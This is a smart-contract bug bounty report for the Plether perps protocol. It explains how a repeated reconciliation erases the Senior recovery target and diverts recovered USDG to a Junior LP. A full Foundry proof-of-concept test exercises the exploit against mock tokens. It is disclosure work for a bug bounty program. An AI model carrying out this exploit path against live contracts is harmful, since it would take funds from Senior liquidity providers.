# \#98873 [SC-High] Incomplete recapitalization fix erases Senior recovery priority and transfers redeemable USDG to a Junior LP

**Submitted on Nov 10th 2026 at 17:13:28 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98873
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a recapitalization is only partially available to restore Senior LPs, the Pool records the unbacked remainder as pending and preserves the full Senior recovery target. A later reconciliation at unchanged backing can count that remainder against the already restored Senior principal, erase the original recovery target, and clear the pending amount. Future Pool recovery is then routed to Junior before the remaining Senior LPs are made whole. An ordinary LP who holds Junior shares and controls the timing of a matured Senior exit can cause this transition and withdraw value that belongs to the remaining Senior cohort.

## Vulnerability Details

The Senior high-water mark records the amount future revenue must restore after impairment. The pinned accounting specification requires a shortfall to hit Junior before Senior, forbids a loss from reducing the Senior high-water mark, and routes later surplus to Senior until that mark is restored. The project's pinned regression test for partially backed recapitalization requires the **full** recovery target to remain in the high-water mark while the unavailable remainder stays pending.

If a reconciliation brings in no new Pool cash and realizes no new loss, the cash already supporting Senior principal remains assigned to Senior. The unbacked recapitalization remainder stays pending, and the original Senior recovery target remains in place until that remainder is backed and applied or an actual Senior withdrawal proportionally reduces the target.

After the first reconciliation partially applies a recapitalization, `seniorPrincipal` contains the amount already assigned to Senior, `seniorHighWaterMark` still records the full recovery target, and `pendingRecapitalizationAssets` contains only the amount that could not yet be assigned. If another reconciliation runs before Pool backing changes, HousePool passes that remaining pending amount to `planReconcile` as `pendingBucketAssets`. The following excerpt shows the relevant statements from the loss branch: it subtracts the pending amount from `snapshot.distributable` **before** comparing available value with the existing `seniorPrincipal`.

~~~solidity
// HousePoolReconcilePlanLib.sol
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets
            ? snapshot.distributable - pendingBucketAssets
            : 0;
}

uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;

HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
    HousePoolWaterfallAccountingLib.planReconcile(
        plan.state.waterfall.seniorPrincipal,
        plan.state.waterfall.juniorPrincipal,
        distributableToClaims
    );

plan.deltaAssets = waterfallPlan.deltaAssets;
if (plan.deltaAssets > 0) {
    plan.state.waterfall =
        HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
}
~~~

Here, `distributableToClaims` is the reduced amount passed to the waterfall, while `plan.state.waterfall.seniorPrincipal` is the principal assigned during the previous reconciliation. When subtracting the pending amount leaves too little `distributableToClaims` to cover that existing principal, `planReconcile` reports a shortfall in `plan.deltaAssets`. `absorbLoss` then reduces Senior principal as though the Pool had suffered a new loss, even though its backing has not fallen. HousePool commits that reduced principal before applying the pending recapitalization amount.

HousePool reads `claimantBuckets.recapitalizationAssets` from the current `pendingRecapitalizationAssets` balance. After the earlier partial application, this balance is only the unapplied remainder. HousePool passes those current buckets as the third argument below and then decrements the amount it applies:

~~~solidity
// HousePool.sol
HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
    state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
);
_decreasePendingClaimantBuckets(settleableClaimantBuckets);
~~~

Inside the helper, that third argument is named `claimantIntentBuckets`. Its recapitalization amount is passed on as `recapitalizationTargetAssets`:

~~~solidity
// HousePoolPendingPreviewLib.sol
applyClaimantRecapitalizationIntent(
    state,
    claimantBuckets.recapitalizationAssets,
    claimantIntentBuckets.recapitalizationAssets
);
~~~

Because the earlier loss calculation can reduce both tranche principals to zero, that call enters the following bootstrap branch:

~~~solidity
// HousePoolPendingPreviewLib.sol
if (state.waterfall.seniorPrincipal == 0
    && state.waterfall.juniorPrincipal == 0)
{
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining
            ? recapitalizationTargetAssets
            : remaining;
    remaining = 0;
}
~~~

At this point, `claimantIntentBuckets.recapitalizationAssets` contains only the **unapplied remainder** from the earlier reconciliation. It no longer contains the original full recovery target. The bootstrap assignment therefore replaces `seniorHighWaterMark` with the smaller remainder. HousePool then decrements `pendingRecapitalizationAssets`, so the original target is neither in the high-water mark nor pending for later recovery. The same backing has been counted against Senior twice, and the remaining Senior holders have lost their recovery priority.

A matured Senior redemption supplies ordinary LP work that lets a permissionless settlement call advance this reconciliation. The withdrawal then scales the already corrupted high-water mark. When the Pool later recovers, the missing Senior deficit is invisible to the waterfall and the value flows to Junior. The owner-funded recapitalization and clearance of degraded mode are normal protocol recovery operations; they are not attacker privileges.

SC Audit Studio finding SC-L1 previously identified uncapped pending-claimant credit and recommended a liability-adjusted settlement kernel. Its stated fix at PR #29 says the unbacked residual remains pending and is applied once backing becomes available. The path above demonstrates that this fix is incomplete at the pinned commit: an intervening ordinary reconciliation consumes the residual and overwrites the full recovery target. This report invokes the program rule allowing an incomplete fix of a published finding, rather than claiming an unrelated first cause.

## Impact Details

**Victim:** an independent Senior LP whose principal and recovery priority are represented by Senior shares and the high-water mark. **Beneficiary:** an LP holding Junior shares who can time the admitted Senior exit and later redeem the Junior allocation. The issue changes the funded redemption amounts, not just a mark, event, or displayed NAV: the remaining Senior holder burns the same fully funded share amount for less USDG, while the cross-cohort actor obtains more USDG in its wallet.

The corrupted high-water mark is the exact value the later waterfall uses to decide whether recovered cash belongs to Senior or Junior:

~~~solidity
// HousePoolWaterfallAccountingLib.sol
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}
nextState.juniorPrincipal += remaining;
~~~

Once the corrupted mark eliminates the Senior deficit, the remaining amount becomes Junior principal. A funded redemption then transfers actual USDG to the controller's chosen receiver:

~~~solidity
// TrancheVault.sol, _consumeRedeemClaim
withdrawalEscrowAssets -= assets;
IERC20(asset()).safeTransfer(receiver, assets);
~~~

The direct loss is recoverable Senior principal being reassigned to Junior. It is distinct from unclaimed yield and does not rely on a freeze-duration claim. Once the misallocated Junior cash has been claimed and Senior shares burned, a later ordinary reconciliation cannot reconstruct the lost original high-water mark. The selected listed impact is **Critical — Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**. The PoC below measures actual token payments and a matched control from the same initial state.

## References

- [Senior-first restoration and high-water mark in the accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L330-L340)
- [Pinned partial-recapitalization regression expectation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L219)
- [HousePool reconciliation and state commit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1558-L1590)
- [Pending-bucket subtraction in HousePoolReconcilePlanLib](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L64-L105)
- [Residual passed as target and zero-principal bootstrap in HousePoolPendingPreviewLib](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L35-L125)
- [Live pending-bucket application and decrement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1758-L1794)
- [Senior restoration before Junior revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L134-L158)
- [Proportional Senior high-water-mark reduction on withdrawal](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L112-L130)
- [Funded redemption transfers USDG to the receiver](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1196-L1213)
- [SC Audit Studio report, SC-L1 and stated fix](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf)
- [Competition scope, listed impact, and incomplete-fix rule](https://immunefi.com/audit-competition/plether/scope/)


## Proof of Concept

## Proof of Concept

The following is **one deterministic Foundry test** against the pinned, unchanged in-scope contracts. It uses the repository's mock USDG and Pyth only. The two paths start from the same EVM snapshot. The control lets backing recover before processing the Senior exit; the adverse path processes the matured Senior exit at the unchanged impaired mark and reconciles again while the residual recapitalization is pending. Both paths later fund the independent victim's entire redemption request and transfer USDG to wallets.

From the pinned repository root, create the directory if absent and save the Solidity code below as packages/perps/test/perps/PFNEW02/PfNew02SeniorRecoveryPoC.t.sol:

~~~bash
mkdir -p packages/perps/test/perps/PFNEW02
~~~

Run from packages/perps:

~~~bash
forge test --match-path test/perps/PFNEW02/PfNew02SeniorRecoveryPoC.t.sol \
  --match-test test_ExtraSettlementDivertsSeniorRecoveryIntoJuniorWithdrawal \
  -vv --threads 2
~~~

The reproduced result is one passing test. At the critical checkpoint, Pool cash is 100,000,000 USDG atoms, Senior principal 50,000,000, Senior high-water mark 100,000,000 and pending recapitalization 50,000,000. After the extra settlement and the actor's funded Senior exit, Pool cash is 98,750,012 atoms, Senior principal and high-water mark are both 48,750,012, and pending recapitalization is zero. No new backing entered between these checkpoints. The independent expectation after the 1,249,988-atom exit is a high-water mark of 97,500,024, leaving **48,750,012 atoms of Senior recovery priority erased**.

| Final committed payment | Control | Adverse path | Difference |
| --- | ---: | ---: | ---: |
| Independent Senior LP USDG paid | 7.033858 | 3.480698 | **−3.553160** |
| Cross-cohort actor wallet USDG | 999,203.254359 | 999,248.379405 | **+45.125046** |
| Newly funded Junior USDG paid | 0 | 47.500023 | **+47.500023** |

The victim's **149,999,100 shares** are requested and fully funded in both paths. The Junior amount is transferred through claimRedeem, and the actor's wallet comparison includes the ordinary Senior exits. These are actual mock-token balance changes, not only NAV quotes. The selected marks and liquidity are local fixture inputs; the test does not assert a historical six-signed-feed market event or public-chain deposits.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";

/// @notice A repeated reconciliation moves Senior recovery value into a Junior withdrawal.
contract PfNew02SeniorRecoveryPoC is BasePerpTest {
    address private constant COHORT_ACTOR = address(0xA110);
    address private constant SENIOR_VICTIM = address(0xB110);
    address private constant TRADER = address(0xA111);
    address private constant KEEPER = address(0xBEEF);

    uint256 private constant OPEN_SIZE = 100_000e18;
    uint256 private constant PARTIAL_CLOSE_SIZE = 95_000e18;
    uint256 private constant OPEN_PRICE = 199_000_000;
    uint256 private constant CLOSE_PRICE = 200_000_000;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_VICTIM;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_ExtraSettlementDivertsSeniorRecoveryIntoJuniorWithdrawal() public {
        _fundJunior(COHORT_ACTOR, 1_000_000e6);
        _fundSenior(COHORT_ACTOR, 1e6);
        _fundTrader(TRADER, 20_000e6);

        _executeOrder(CfdTypes.Side.SHORT, OPEN_SIZE, 10_000e6, false, OPEN_PRICE, "open-short");

        _finishCooldown(juniorVault, COHORT_ACTOR);
        uint256 originalJuniorShares = juniorVault.balanceOf(COHORT_ACTOR);
        vm.prank(COHORT_ACTOR);
        uint256 originalJuniorRequest =
            juniorVault.requestRedeem(originalJuniorShares, COHORT_ACTOR, COHORT_ACTOR);
        _warpToEpoch(originalJuniorRequest);
        _settleThroughRouter(OPEN_PRICE);

        uint256 oldFundedShares = juniorVault.claimableRedeemRequest(originalJuniorRequest, COHORT_ACTOR);
        uint256 oldFundedAssets = juniorVault.claimableRedeemAssets(originalJuniorRequest, COHORT_ACTOR);
        assertGt(oldFundedShares, 0, "the first LP exit must create funded escrow");
        assertGt(oldFundedAssets, 0, "the first LP exit must create an asset claim");
        assertLt(oldFundedShares, originalJuniorShares, "part of the Junior request must remain queued");

        _executeOrder(CfdTypes.Side.SHORT, PARTIAL_CLOSE_SIZE, 0, true, CLOSE_PRICE, "partial-close");
        assertTrue(engine.degradedMode(), "the constrained close must enter degraded mode");

        uint256 recapitalization = 100e6;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        engine.clearDegradedMode();

        // Common first settlement: apply the capped recapitalization and refund the zero-value
        // remainder of the old Junior request.
        _settleThroughRouter(CLOSE_PRICE);
        assertGt(pool.pendingRecapitalizationAssets(), 0, "the first recovery pass must retain recap intent");
        assertGt(juniorVault.refundableRedeemRequest(originalJuniorRequest, COHORT_ACTOR), 0);

        uint256 cashBeforeExtraSettlement = pool.totalAssets();
        uint256 seniorBeforeExtraSettlement = pool.seniorPrincipal();
        uint256 highWaterBeforeExtraSettlement = pool.seniorHighWaterMark();
        uint256 pendingBeforeExtraSettlement = pool.pendingRecapitalizationAssets();

        // Give the independent seed holder ordinary, unlocked Senior shares above its permanent floor.
        _finishCooldown(seniorVault, COHORT_ACTOR);
        uint256 transferredSeniorShares = seniorVault.balanceOf(COHORT_ACTOR) / 2;
        vm.prank(COHORT_ACTOR);
        seniorVault.transfer(SENIOR_VICTIM, transferredSeniorShares);

        uint256 firstSeniorExit = _queueSmallSeniorExit();
        uint256 commonState = vm.snapshotState();

        // History A: economic backing recovers before the first Senior exit is processed.
        _settleThroughRouter(OPEN_PRICE);
        _claimFundedSeniorExit(firstSeniorExit);
        uint256 secondSeniorExitA = _queueSmallSeniorExit();
        _settleThroughRouter(OPEN_PRICE);
        _claimFundedSeniorExit(secondSeniorExitA);
        _closeRemainingPosition();
        (uint256 controlSeniorCashPaid, uint256 controlVictimSharesRequested, uint256 controlVictimSharesFunded) =
            _redeemVictimTenth();
        _claimOldJuniorRequest(originalJuniorRequest);
        uint256 controlActorCash = settlementToken.balanceOf(COHORT_ACTOR);
        assertEq(
            juniorVault.convertToAssets(juniorVault.balanceOf(COHORT_ACTOR)),
            0,
            "control recovery must not allocate value to Junior"
        );

        assertTrue(vm.revertToState(commonState));

        // History B: the same matured Senior exit gives a keeper lawful work at the unchanged
        // impaired mark. The extra reconciliation commits before backing recovers.
        _settleThroughRouter(CLOSE_PRICE);
        _claimFundedSeniorExit(firstSeniorExit);
        uint256 seniorAfterExtra = pool.seniorPrincipal();
        uint256 highWaterAfterExtra = pool.seniorHighWaterMark();
        uint256 pendingAfterExtra = pool.pendingRecapitalizationAssets();
        uint256 cashAfterExtraSettlement = pool.totalAssets();
        assertLt(cashAfterExtraSettlement, cashBeforeExtraSettlement, "Senior exit must have real Pool funding");

        uint256 secondSeniorExitB = _queueSmallSeniorExit();
        _settleThroughRouter(OPEN_PRICE);
        _claimFundedSeniorExit(secondSeniorExitB);
        _claimOldJuniorRequest(originalJuniorRequest);

        _finishCooldown(juniorVault, COHORT_ACTOR);
        uint256 returnedJuniorShares = juniorVault.balanceOf(COHORT_ACTOR);
        vm.prank(COHORT_ACTOR);
        uint256 newJuniorRequest =
            juniorVault.requestRedeem(returnedJuniorShares, COHORT_ACTOR, COHORT_ACTOR);
        _warpToEpoch(newJuniorRequest);
        _settleThroughRouter(OPEN_PRICE);
        uint256 newlyFundedShares = juniorVault.claimableRedeemRequest(newJuniorRequest, COHORT_ACTOR);
        assertGt(newlyFundedShares, 0, "attack history must create a new Junior cash claim");
        uint256 actorWalletBefore = settlementToken.balanceOf(COHORT_ACTOR);
        vm.prank(COHORT_ACTOR);
        uint256 newJuniorCash = juniorVault.claimRedeem(
            newJuniorRequest, newlyFundedShares, COHORT_ACTOR, COHORT_ACTOR
        );
        assertEq(settlementToken.balanceOf(COHORT_ACTOR) - actorWalletBefore, newJuniorCash);

        _closeRemainingPosition();
        (uint256 attackSeniorCashPaid, uint256 attackVictimSharesRequested, uint256 attackVictimSharesFunded) =
            _redeemVictimTenth();

        uint256 attackActorCash = settlementToken.balanceOf(COHORT_ACTOR);

        assertGt(newJuniorCash, 0, "the accounting difference must reach an actual payment");
        assertEq(attackVictimSharesRequested, controlVictimSharesRequested, "victim must request equal shares");
        assertEq(controlVictimSharesFunded, controlVictimSharesRequested, "control victim request must fully fund");
        assertEq(attackVictimSharesFunded, attackVictimSharesRequested, "attack victim request must fully fund");
        assertLt(attackSeniorCashPaid, controlSeniorCashPaid, "passive Senior must receive less actual cash");
        assertGt(attackActorCash, controlActorCash, "cross-cohort actor must receive more actual cash");
        assertEq(pendingAfterExtra, 0, "extra settlement wrongly consumes pending Senior recovery");
        assertLt(highWaterAfterExtra, highWaterBeforeExtraSettlement, "Senior recovery target falls");

        emit log_named_uint("Pool cash before extra settlement", cashBeforeExtraSettlement);
        emit log_named_uint("Pool cash after extra settlement", cashAfterExtraSettlement);
        emit log_named_uint("Senior before extra settlement", seniorBeforeExtraSettlement);
        emit log_named_uint("Senior HWM before extra settlement", highWaterBeforeExtraSettlement);
        emit log_named_uint("Pending recap before extra settlement", pendingBeforeExtraSettlement);
        emit log_named_uint("Senior after extra settlement", seniorAfterExtra);
        emit log_named_uint("Senior HWM after extra settlement", highWaterAfterExtra);
        emit log_named_uint("Pending recap after extra settlement", pendingAfterExtra);
        emit log_named_uint("New Junior cash actually paid", newJuniorCash);
        emit log_named_uint("Passive Senior cash paid in control", controlSeniorCashPaid);
        emit log_named_uint("Passive Senior cash paid after extra settlement", attackSeniorCashPaid);
        emit log_named_uint("Passive Senior actual cash loss", controlSeniorCashPaid - attackSeniorCashPaid);
        emit log_named_uint("Passive Senior shares requested", controlVictimSharesRequested);
        emit log_named_uint("Passive Senior shares funded in control", controlVictimSharesFunded);
        emit log_named_uint("Passive Senior shares funded after extra settlement", attackVictimSharesFunded);
        emit log_named_uint("Actor wallet cash in control", controlActorCash);
        emit log_named_uint("Actor wallet cash after extra settlement", attackActorCash);
        emit log_named_uint("Actor actual cash gain", attackActorCash - controlActorCash);
    }

    function _executeOrder(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price,
        bytes32 clientOrderId
    ) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = isClose ? 1 : type(uint256).max;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + 120);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash =
            IOrderLifecycleBook(address(router.lifecycleBook())).currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;

        vm.prank(TRADER);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceUpdate = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleThroughRouter(uint256 price) private {
        bytes[] memory priceUpdate = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(priceUpdate);
    }

    function _finishCooldown(TrancheVault vault, address owner) private {
        uint256 unlockTime = vault.lastDepositTime(owner) + vault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockTime) vm.warp(unlockTime);
    }

    function _warpToEpoch(uint256 requestId) private {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) vm.warp(maturity);
    }

    function _queueSmallSeniorExit() private returns (uint256 requestId) {
        _finishCooldown(seniorVault, COHORT_ACTOR);
        uint256 shares = seniorVault.balanceOf(COHORT_ACTOR) / 10;
        assertGt(shares, 0);
        vm.prank(COHORT_ACTOR);
        requestId = seniorVault.requestRedeem(shares, COHORT_ACTOR, COHORT_ACTOR);
        _warpToEpoch(requestId);
    }

    function _claimFundedSeniorExit(uint256 requestId) private {
        uint256 shares = seniorVault.claimableRedeemRequest(requestId, COHORT_ACTOR);
        if (shares == 0) return;
        vm.prank(COHORT_ACTOR);
        seniorVault.claimRedeem(requestId, shares, COHORT_ACTOR, COHORT_ACTOR);
    }

    function _redeemVictimTenth()
        private
        returns (uint256 assets, uint256 requestedShares, uint256 fundedShares)
    {
        _finishCooldown(seniorVault, SENIOR_VICTIM);
        requestedShares = seniorVault.balanceOf(SENIOR_VICTIM) / 10;
        assertGt(requestedShares, 0);
        vm.prank(SENIOR_VICTIM);
        uint256 requestId = seniorVault.requestRedeem(requestedShares, SENIOR_VICTIM, SENIOR_VICTIM);
        _warpToEpoch(requestId);
        _settleThroughRouter(OPEN_PRICE);
        fundedShares = seniorVault.claimableRedeemRequest(requestId, SENIOR_VICTIM);
        assertGt(fundedShares, 0, "victim request must fund");
        uint256 walletBefore = settlementToken.balanceOf(SENIOR_VICTIM);
        vm.prank(SENIOR_VICTIM);
        assets = seniorVault.claimRedeem(requestId, fundedShares, SENIOR_VICTIM, SENIOR_VICTIM);
        assertEq(settlementToken.balanceOf(SENIOR_VICTIM) - walletBefore, assets);
    }

    function _closeRemainingPosition() private {
        _executeOrder(
            CfdTypes.Side.SHORT,
            OPEN_SIZE - PARTIAL_CLOSE_SIZE,
            0,
            true,
            OPEN_PRICE,
            "final-close"
        );
    }

    function _claimOldJuniorRequest(uint256 requestId) private returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(requestId, COHORT_ACTOR);
        if (shares != 0) {
            vm.prank(COHORT_ACTOR);
            assets = juniorVault.claimRedeem(requestId, shares, COHORT_ACTOR, COHORT_ACTOR);
        }
        vm.prank(COHORT_ACTOR);
        juniorVault.claimRedeemRefund(requestId, COHORT_ACTOR, COHORT_ACTOR);
    }
}
~~~

